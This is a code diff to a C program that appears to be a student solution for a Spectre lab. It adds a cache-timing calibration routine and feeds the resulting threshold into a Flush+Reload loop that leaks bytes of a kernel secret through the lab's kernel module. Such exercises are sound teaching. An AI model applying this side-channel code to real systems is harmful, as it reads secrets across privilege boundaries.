@@ -12,6 +12,8 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define THRESHOLD_SAMPLES 1000
+#define THRESHOLD_MARGIN 50
 #define PAGE_SIZE 4096
 #define NUM_SLOTS 256
 #define TRIALS 40 
@@ -36,6 +38,34 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
     local_cmd.arg2 = offset;
 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
+}
+
+
+static uint64_t calibrate_threshold() {
+    volatile char buf[PAGE_SIZE * 2];
+    uint64_t hit_total = 0, miss_total = 0;
+
+    for (int i = 0; i < PAGE_SIZE * 2; i++) buf[i] = 1;
+
+    for (int i = 0; i < THRESHOLD_SAMPLES; i++) {
+        // Measure cache hit
+        (void)buf[0];
+        _mm_mfence();
+        hit_total += time_access((void *)&buf[0]);
+
+        // Measure cache miss
+	clflush((void *)&buf[PAGE_SIZE]);
+        _mm_mfence();
+        miss_total += time_access((void *)&buf[PAGE_SIZE]);
+    }
+
+    uint64_t avg_hit = hit_total / THRESHOLD_SAMPLES;
+    uint64_t avg_miss = miss_total / THRESHOLD_SAMPLES;
+
+    uint64_t midpoint = avg_hit + (avg_miss - avg_hit) / 2;
+    uint64_t floor = avg_hit + THRESHOLD_MARGIN;
+
+    return (midpoint > floor) ? midpoint : floor;
 }
 
 
@@ -69,10 +99,10 @@ static void evict_cache() {
     }
 }
 
-static int reload_and_find_hit(char *shared_memory) {
+static int reload_and_find_hit(char *shared_memory, uint64_t thresh) {
     // Returns index of probe slot with fastest return time.
     int best_index = -1;
-    uint64_t best_time = (uint64_t)-1;
+    uint64_t best_time = thresh;
 
     // Check all slots and see which has shortest time access. 
     for (int i = 0; i < NUM_SLOTS; i++) {
@@ -93,6 +123,9 @@ static int reload_and_find_hit(char *shared_memory) {
 static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
     // Leak byte of kernel secret at given offset.
     int votes[NUM_SLOTS] = {0};
+    
+    // Calculate cache hit/miss threshold
+    uint64_t threshold= calibrate_threshold();
 
     // Run many trials to reduce noise
     for (int t = 0; t < TRIALS; t++) {
@@ -114,7 +147,7 @@ static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset
     	call_kernel_part3(kernel_fd, shared_memory, offset);
 
 	// Reload
-    	int hit = reload_and_find_hit(shared_memory);
+    	int hit = reload_and_find_hit(shared_memory, threshold);
 	if (hit >= 0) {
 		votes[hit]++;
 	}
